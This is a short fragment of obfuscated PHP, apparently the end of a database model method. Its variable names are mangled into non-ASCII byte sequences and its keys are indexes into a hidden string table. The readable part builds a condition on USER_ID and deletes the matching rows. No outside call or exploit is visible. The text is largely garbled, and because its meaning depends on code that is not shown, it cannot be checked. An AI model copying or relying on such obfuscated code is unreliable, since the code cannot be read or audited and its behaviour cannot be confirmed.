array($¨î«£Š [1652] => USER_ID, $¨î«£Š [521] => array($¨î«£Š [1034], 0), $¨î«£Š [459] => $˜ÉÍÄ¹œ); return $this->where($ÍÍíåÕ–)->delete(); } }